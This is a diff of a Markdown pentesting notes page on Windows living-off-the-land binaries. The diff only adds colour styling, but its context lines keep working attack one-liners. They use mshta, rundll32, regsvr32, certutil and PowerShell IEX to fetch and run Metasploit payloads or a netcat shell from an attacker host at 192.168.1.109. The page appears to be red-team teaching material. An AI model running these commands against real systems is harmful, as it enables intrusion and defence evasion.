@@ -1,37 +1,37 @@
 # ⭕ LOL Binaries
 
-## General Concept
+## <mark style="color:red;">General Concept</mark>
 
 Living Off the Land (LOL) binaries are the native Microsoft binary applications that are preinstalled on windows systems and are almost always available for us to use. these can be as simple as the echo command or be used for more advanced stuff like downloading and executing files, converting exe to cert or other interesting things that an attacker can leverage to bypass defense mechanisms.
 
 Generally speaking, when we want a bin/reverse shell we go looking for the specific binaries that can download and execute our payloads. [LOLBAS ](https://lolbas-project.github.io)is a great collection of all known LOL binaries and we can search the collection for binaries with specific capabilities that we want by using a slash '/' and the name of the capability in the search bar for example /execute will show us all binaries that can execute code or scripts.
 
-### For Download
+### <mark style="color:orange;">For Download</mark>
 
 {% embed url="https://lolbas-project.github.io/#/download" %}
 
-### For Execute
+### <mark style="color:orange;">For Execute</mark>
 
 {% embed url="https://lolbas-project.github.io/#/execute" %}
 
-## Example Tools
+## <mark style="color:red;">Example Tools</mark>
 
-**Mshta.exe :** Launch HTA attack via HTA Web Server of Metasploit
+<mark style="color:green;">**Mshta.exe :**</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> Launch HTA attack via HTA Web Server of Metasploit
 
-**Rundll32.exe :** Launch Rundll32 Attack via SMB Delivery of Metasploit
+<mark style="color:green;">**Rundll32.exe :**</mark> Launch Rundll32 Attack via SMB Delivery of Metasploit
 
-**Regsvr32.exe :** Launch Regsvr32 via Script Web Delivery of Metasploit
+<mark style="color:green;">**Regsvr32.exe :**</mark> Launch Regsvr32 via Script Web Delivery of Metasploit
 
-**Certutil.exe :** Launch MSbuild Attack via Msfvenom C# shellcode
+<mark style="color:green;">**Certutil.exe :**</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> Launch MSbuild Attack via Msfvenom C# shellcode
 
-**Powershell.exe :**
+<mark style="color:green;">**Powershell.exe :**</mark>
 
 * Launch cscript.exe via Powershell
 * Launch Batch File Attack via Powershell
 
-**Msiexec.exe :** Launch msiexec attack via msfvenom
+<mark style="color:green;">**Msiexec.exe :**</mark> Launch msiexec attack via msfvenom
 
-## Mshta.exe
+## <mark style="color:red;">Mshta.exe</mark>
 
 Mshta.exe runs the Microsoft HTML Application Host, the Windows OS utility responsible for running **HTA**( HTML Application) files. HTML files that we can run JavaScript or VBScript with. You can interpret these files using the Microsoft MSHTA.exe tool.
 
@@ -48,7 +48,7 @@ msf exploit(windows/misc/hta_server) > exploit
 mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
 ```
 
-## Rundll32.exe
+## <mark style="color:red;">Rundll32.exe</mark>
 
 Rundll32.exe is associated with Windows Operating System that allows you to invoke a function exported from a **DLL**, either 16-bit or 32-bit and store it in proper memory libraries.
 
@@ -68,7 +68,7 @@ Now run the malicious code through rundll32.exe on the victim machine (vulnerabl
 rundll32.exe \\192.168.1.109\vabFG\test.dll,0
 ```
 
-## Regsvr32.exe
+## <mark style="color:red;">Regsvr32.exe</mark>
 
 Regsvr32 is a command-line utility to register and unregister OLE controls, such as **DLLs** and ActiveX controls in the Windows Registry. Regsvr32.exe is installed in the %systemroot%\System32 folder in Windows XP and later versions of Windows.
 
@@ -107,7 +107,7 @@ msf exploit (web_delivery)>exploit
 regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
 ```
 
-## Certutil.exe
+## <mark style="color:red;">Certutil.exe</mark>
 
 Certutil.exe is a command-line program that is installed as part of Certificate Services. We can use this tool to execute our malicious **exe file** in the target machine to get a meterpreter session.
 
@@ -133,7 +133,7 @@ msf exploit(multi/handler) > exploit
 certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
 ```
 
-## **Batch File**
+## <mark style="color:red;">**Batch File**</mark>
 
 PowerShell allows the client to execute **bat file**_._
 
@@ -151,7 +151,7 @@ Then execute the following command on the remote side to get netcat session.
 // Some powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
 ```
 
-## **Cscript**
+## <mark style="color:red;">**Cscript**</mark>
 
 PowerShell allows the client to execute **cscript.exe** to run **wsf, js** and **vbscript.**
 
@@ -173,7 +173,7 @@ msf exploit(multi/handler) > set lport 1234
 msf exploit(multi/handler) > exploit
 ```
 
-## Msiexec.exe
+## <mark style="color:red;">Msiexec.exe</mark>
 
 As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by **MSI packages** for the installation of applications. The executable program that interprets packages and installs products is Msiexec.exe.
 
